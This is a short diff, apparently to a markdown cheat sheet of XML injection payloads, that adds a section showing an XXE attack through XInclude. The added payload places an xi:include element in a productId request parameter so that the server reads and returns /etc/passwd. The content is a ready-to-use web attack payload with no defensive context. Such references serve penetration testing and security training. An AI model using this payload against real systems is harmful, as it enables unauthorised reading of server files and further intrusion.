@@ -16,3 +16,9 @@
   <storeId>1</storeId>
 </stockCheck>
 ```
+### XXE using XInclude to retrieve files
+
+```
+productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude">
+<xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1
+```
